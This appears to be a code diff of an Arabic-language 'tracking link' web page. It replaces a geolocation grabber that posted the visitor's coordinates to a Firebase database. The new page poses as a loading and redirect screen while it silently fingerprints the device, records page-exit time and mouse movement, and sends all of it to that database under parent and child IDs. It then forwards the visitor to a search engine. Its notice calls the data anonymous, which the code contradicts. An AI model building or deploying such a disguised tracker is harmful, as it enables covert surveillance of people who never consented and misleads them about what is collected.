@@ -1,35 +1,292 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جارٍ التحميل...</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        h1 {
+            margin-bottom: 15px;
+            font-size: 24px;
+        }
+        
+        .info {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: right;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 8px;
+            background: rgba(0, 255, 0, 0.2);
+            display: none;
+        }
+        
+        .error {
+            background: rgba(255, 0, 0, 0.2);
+        }
+        
+        .redirect-btn {
+            background: white;
+            color: #667eea;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .redirect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
 <body>
-<h3>جاري تحديد الموقع...</h3>
+    <div class="container">
+        <h1>🚀 جارٍ إعادة التوجيه...</h1>
+        <div class="loader"></div>
+        
+        <p>جاري تجهيز الصفحة وجمع المعلومات الضرورية</p>
+        
+        <div id="status" class="status">
+            تم تسجيل البيانات بنجاح ✓
+        </div>
+        
+        <div id="error" class="status error">
+            حدث خطأ في الاتصال
+        </div>
+        
+        <button id="redirectBtn" class="redirect-btn" onclick="redirectToSearch()" style="display: none;">
+            انتقل إلى محرك البحث
+        </button>
+        
+        <div class="info">
+            <p><strong>ملاحظة:</strong> هذا الرابط مسجل للرقابة الأبوية</p>
+            <p>جميع البيانات مجهولة وتستخدم للأغراض التربوية فقط</p>
+        </div>
+    </div>
 
-<script>
-  // ناخد المفتاح من الرابط
-  const params = new URLSearchParams(window.location.search);
-  const key = params.get("key"); // بدل id سميته key
+    <script>
+        // جمع جميع المعلومات المطلوبة
+        function collectDeviceInfo() {
+            const info = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                hostname: window.location.hostname,
+                path: window.location.pathname,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || 'direct',
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                online: navigator.onLine
+            };
+            
+            // جمع معلومات المتصفح
+            const browsers = {
+                chrome: /Chrome/.test(navigator.userAgent),
+                firefox: /Firefox/.test(navigator.userAgent),
+                safari: /Safari/.test(navigator.userAgent),
+                edge: /Edg/.test(navigator.userAgent),
+                opera: /Opera/.test(navigator.userAgent)
+            };
+            
+            info.browser = Object.keys(browsers).find(key => browsers[key]) || 'unknown';
+            
+            return info;
+        }
 
-  if (!key) {
-    document.body.innerHTML = "لينك غير صالح";
-  }
+        // استخراج الـ Parameters من الرابط
+        function getUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const params = {};
+            
+            for (const [key, value] of urlParams.entries()) {
+                params[key] = value;
+            }
+            
+            return params;
+        }
 
-  // ناخد الموقع
-  navigator.geolocation.getCurrentPosition(
-    function(pos) {
-      fetch("https://location-21303-default-rtdb.firebaseio.com/.firebaseio.com/locations/" + key + ".json", {
-        method: "POST",
-        body: JSON.stringify({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          time: new Date().toLocaleString()
-        })
-      });
-      document.body.innerHTML = "تم الإرسال ✔";
-    },
-    function() {
-      document.body.innerHTML = "تم رفض الموقع ❌";
-    }
-  );
-</script>
+        // إرسال البيانات إلى Firebase
+        async function sendDataToFirebase() {
+            try {
+                const params = getUrlParams();
+                const deviceInfo = collectDeviceInfo();
+                
+                // التحقق من وجود childId و parentId
+                if (!params.child || !params.parent) {
+                    throw new Error('معلمات الرابط غير مكتملة');
+                }
+                
+                const dataToSend = {
+                    ...deviceInfo,
+                    childId: params.child,
+                    parentId: params.parent
+                };
+                
+                // رابط قاعدة البيانات الخاص بك
+                const firebaseUrl = `https://location-21303-default-rtdb.firebaseio.com/Parents/${params.parent}/children/${params.child}/visits.json`;
+                
+                // إرسال البيانات
+                const response = await fetch(firebaseUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(dataToSend)
+                });
+                
+                if (!response.ok) {
+                    throw new Error('فشل في إرسال البيانات');
+                }
+                
+                const result = await response.json();
+                
+                // إظهار زر التوجيه بعد النجاح
+                document.getElementById('redirectBtn').style.display = 'block';
+                document.getElementById('status').style.display = 'block';
+                
+                return result;
+                
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('error').style.display = 'block';
+                document.getElementById('error').innerHTML = `حدث خطأ: ${error.message}`;
+                document.getElementById('redirectBtn').style.display = 'block';
+                return null;
+            }
+        }
 
+        // توجيه المستخدم إلى محرك بحث
+        function redirectToSearch() {
+            // يمكنك تغيير الرابط إلى أي موقع تريده
+            const searchEngines = [
+                'https://www.google.com',
+                'https://www.bing.com',
+                'https://search.yahoo.com',
+                'https://duckduckgo.com'
+            ];
+            
+            const randomEngine = searchEngines[Math.floor(Math.random() * searchEngines.length)];
+            window.location.href = randomEngine;
+        }
+
+        // تشغيل عند تحميل الصفحة
+        window.onload = function() {
+            // إخفاء الزر في البداية
+            document.getElementById('redirectBtn').style.display = 'none';
+            
+            // بدء إرسال البيانات
+            setTimeout(async () => {
+                await sendDataToFirebase();
+                
+                // بعد 3 ثوانٍ، إخفاء اللودر
+                setTimeout(() => {
+                    document.querySelector('.loader').style.display = 'none';
+                }, 3000);
+                
+            }, 1000);
+        }
+
+        // تتبع إذا حاول المستخدم الخروج
+        window.addEventListener('beforeunload', function(e) {
+            const params = getUrlParams();
+            const exitData = {
+                timestamp: new Date().toISOString(),
+                event: 'page_exit',
+                timeOnPage: Date.now() - window.performance.timing.navigationStart
+            };
+            
+            if (params.child && params.parent) {
+                fetch(`https://location-21303-default-rtdb.firebaseio.com/Parents/${params.parent}/children/${params.child}/events.json`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(exitData)
+                });
+            }
+        });
+
+        // تتبع حركة الماوس والنقر (اختياري)
+        let activity = [];
+        document.addEventListener('mousemove', function(e) {
+            activity.push({
+                x: e.clientX,
+                y: e.clientY,
+                time: Date.now()
+            });
+            
+            // حفظ كل 10 ثوانٍ
+            if (activity.length > 50) {
+                const params = getUrlParams();
+                if (params.child && params.parent) {
+                    fetch(`https://location-21303-default-rtdb.firebaseio.com/Parents/${params.parent}/children/${params.child}/activity.json`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(activity)
+                    });
+                    activity = [];
+                }
+            }
+        });
+    </script>
 </body>
 </html>
